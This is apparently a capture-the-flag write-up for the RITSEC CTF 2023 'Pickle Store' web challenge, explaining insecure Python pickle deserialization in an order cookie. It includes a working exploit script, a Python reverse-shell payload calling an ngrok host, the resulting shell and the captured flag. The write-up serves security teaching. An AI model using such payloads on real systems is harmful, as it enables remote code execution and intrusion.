# Pickle Store

- 223 Points / 109 Solves

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

New pickles just dropped! Check out the store.

[https://pickles-web.challenges.ctf.ritsec.club/](https://pickles-web.challenges.ctf.ritsec.club/)

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230402122900.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230402122911.png)

In here, we can pick 4 different pickles.

**View source page:**
```html
[...]
<div>
    <a href="/order">
    <input type='button' class='button'
      onclick='document.cookie=
      "order=gASVDwAAAAAAAACMC3N3ZWV0cGlja2xllC4="'
      value='Sweet Pickle: $2'>
    </a>
    <a href="/order">
    <input type='button' class='button'
      onclick='document.cookie="order=gASVDgAAAAAAAACMCnNvdXJwaWNrbGWULg=="'
      value='Sour Pickle: $2'>
    </a>
    <a href="/order">
    <input type='button' class='button'
      onclick='document.cookie=
      "order=gASVEAAAAAAAAACMDHNhdm9yeXBpY2tsZZQu"'
      value='Savory Pickle: $2'>
    </a>
    <a href="/order">
    <input type='button' class='button'
      onclick='document.cookie=
      "order=gASVDwAAAAAAAACMC3NhbHR5cGlja2xllC4="'
      value='Salty Pickle: $2'>
    </a>
</div>
[...]
```

When those buttons are clicked, it'll bring us to `/order`, and set a new cookie called `order`, with value base64 encoded string. It's base64 encoded because the last character has `=`, which is a base64 encoding's padding character.

Let's click on the first one:

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230402123310.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230402123324.png)

As excepted, it brings us to `/order`, and response us the pickle name.

**Now, I wonder what's that base64 string. Let's decode that!**
```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/Web/Pickle-Store)-[2023.04.02|12:34:45(HKT)]
└> echo 'gASVDwAAAAAAAACMC3N3ZWV0cGlja2xllC4=' | base64 -d | xxd
00000000: 8004 950f 0000 0000 0000 008c 0b73 7765  .............swe
00000010: 6574 7069 636b 6c65 942e                 etpickle..
```

As you can see, after decoded, it's just some raw bytes.

Luckly, this challenge's title and website contents gave us a big hint: ***Pickle***.

In Python, there's a library called "Pickle", which is an object ***serialization*** library for Python.

> The [`pickle`](https://docs.python.org/3/library/pickle.html#module-pickle "pickle: Convert Python objects to streams of bytes and back.") module implements binary protocols for serializing and de-serializing a Python object structure. _“Pickling”_ is the process whereby a Python object hierarchy is converted into a byte stream, and _“unpickling”_ is the inverse operation, whereby a byte stream (from a [binary file](https://docs.python.org/3/glossary.html#term-binary-file) or [bytes-like object](https://docs.python.org/3/glossary.html#term-bytes-like-object)) is converted back into an object hierarchy. Pickling (and unpickling) is alternatively known as “serialization”, “marshalling,” \[[1]\](https://docs.python.org/3/library/pickle.html#id7) or “flattening”; however, to avoid confusion, the terms used here are “pickling” and “unpickling”. (From [`pickle` documentation](https://docs.python.org/3/library/pickle.html))

**If you go to [Pickle's documentation](https://docs.python.org/3/library/pickle.html), you'll see this:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230402123806.png)

## Exploitation

Armed with above information, it's clear that the `order` cookie is vulnerable to ***Insecure Deserialization via Python's Pickle***.

**According to [HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization#pickle), we can gain Remote Code Execution (RCE) via the `__reduce__` magic method:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230402124014.png)

**Now, let's create our own evil pickle serialized object, and send it!!**
```py
#!/usr/bin/env python3
import pickle, os, base64
import requests

class P(object):
    def __reduce__(self):
        return (os.system,("id ",))

def main():
    pickledPayload = base64.b64encode(pickle.dumps(P())).decode()
    print(f'[*] Payload: {pickledPayload}')

    URL = 'https://pickles-web.challenges.ctf.ritsec.club/order'
    cookie = {
        'order': pickledPayload
    }

    print('[*] Request result:')
    orderRequestResult = requests.get(URL, cookies=cookie)
    print(orderRequestResult.text)

if __name__ == '__main__':
    main()
```

```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/Web/Pickle-Store)-[2023.04.02|12:48:25(HKT)]
└> python3 solve.py
[*] Payload: gASVHgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjANpZCCUhZRSlC4=
[*] Request result:
<!DOCTYPE html>
<head>
  <title>Pickle Store</title>
  <link rel="stylesheet" href="/static/style.css">
</head>
<body>
  <h1>Here's your order!</h1>
  <h2>0</h2>
  <a class='button' href='/'>New Order</a>
</body>
```

Umm... `0`??

It seems like the `/order` doesn't reflect (display) our payload's result...

Hmm... Let's get a shell then.

**After some trial and error, the Python3 reverse shell worked:** (From [revshells.com](https://www.revshells.com/))
```py
#!/usr/bin/env python3
import pickle, os, base64
import requests

class RCE(object):
    def __reduce__(self):
        return (os.system,('''python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("0.tcp.ap.ngrok.io",11713));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' ''',))

def main():
    pickledPayload = base64.b64encode(pickle.dumps(RCE())).decode()
    print(f'[*] Payload: {pickledPayload}')

    URL = 'https://pickles-web.challenges.ctf.ritsec.club/order'
    cookie = {
        'order': pickledPayload
    }

    print('[*] Request result:')
    orderRequestResult = requests.get(URL, cookies=cookie)
    print(orderRequestResult.text)

if __name__ == '__main__':
    main()
```

**Setup a `nc` listener:**
```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023)-[2023.04.02|13:13:43(HKT)]
└> nc -lnvp 4444
listening on [any] 4444 ...
```

**Since we don't have a VPN connection to the challenge's instance, we'll need to do port forwarding. I'll use `ngrok` to do that:**
```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/Web/Pickle-Store)-[2023.04.02|13:06:54(HKT)]
└> ngrok tcp 4444
[...]
Forwarding                    tcp://0.tcp.ap.ngrok.io:11713 -> localhost:4444
[...]
```

**Send the payload:**
```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023/Web/Pickle-Store)-[2023.04.02|13:18:44(HKT)]
└> python3 solve.py
[*] Payload: gASVtAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjJlweXRob24zIC1jICdpbXBvcnQgb3MscHR5LHNvY2tldDtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKCIwLnRjcC5hcC5uZ3Jvay5pbyIsMTE3MTMpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJyCUhZRSlC4=
[*] Request result:

```

```shell
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023)-[2023.04.02|13:13:43(HKT)]
└> nc -lnvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 38340
user@NSJAIL:/home/user$
```

Boom! I'm in!

**Let's get the flag!**
```shell
user@NSJAIL:/home/user$ ls -lah /
total 64K
drwxr-xr-x 17 nobody nogroup 4.0K Apr  2 02:27 .
drwxr-xr-x 17 nobody nogroup 4.0K Apr  2 02:27 ..
lrwxrwxrwx  1 nobody nogroup    7 Mar  8 02:05 bin -> usr/bin
drwxr-xr-x  2 nobody nogroup 4.0K Apr 15  2020 boot
drwxr-xr-x  5 nobody nogroup  360 Apr  2 04:51 dev
drwxr-xr-x 35 nobody nogroup 4.0K Apr  2 02:26 etc
-rw-r--r--  1 nobody nogroup   28 Mar 30 04:04 flag
drwxr-xr-x  3 nobody nogroup 4.0K Apr  2 02:26 home
lrwxrwxrwx  1 nobody nogroup    7 Mar  8 02:05 lib -> usr/lib
lrwxrwxrwx  1 nobody nogroup    9 Mar  8 02:05 lib32 -> usr/lib32
lrwxrwxrwx  1 nobody nogroup    9 Mar  8 02:05 lib64 -> usr/lib64
lrwxrwxrwx  1 nobody nogroup   10 Mar  8 02:05 libx32 -> usr/libx32
drwxr-xr-x  2 nobody nogroup 4.0K Mar  8 02:06 media
drwxr-xr-x  2 nobody nogroup 4.0K Mar  8 02:06 mnt
drwxr-xr-x  2 nobody nogroup 4.0K Mar  8 02:06 opt
drwxr-xr-x  2 nobody nogroup 4.0K Apr 15  2020 proc
drwx------  3 nobody nogroup 4.0K Apr  2 02:26 root
drwxr-xr-x  5 nobody nogroup 4.0K Mar  8 02:09 run
lrwxrwxrwx  1 nobody nogroup    8 Mar  8 02:05 sbin -> usr/sbin
drwxr-xr-x  2 nobody nogroup 4.0K Mar  8 02:06 srv
drwxr-xr-x  2 nobody nogroup 4.0K Apr 15  2020 sys
drwxrwxrwt  2 user   user      80 Apr  2 05:18 tmp
drwxr-xr-x 13 nobody nogroup 4.0K Mar  8 02:06 usr
drwxr-xr-x 11 nobody nogroup 4.0K Mar  8 02:09 var
user@NSJAIL:/home/user$ cat /flag
RS{TH3_L345T_53CUR3_P1CKL3}
```

- **Flag: `RS{TH3_L345T_53CUR3_P1CKL3}`**

## Conclusion

What we've learned:

1. Insecure Deserialization In Python's Pickle Library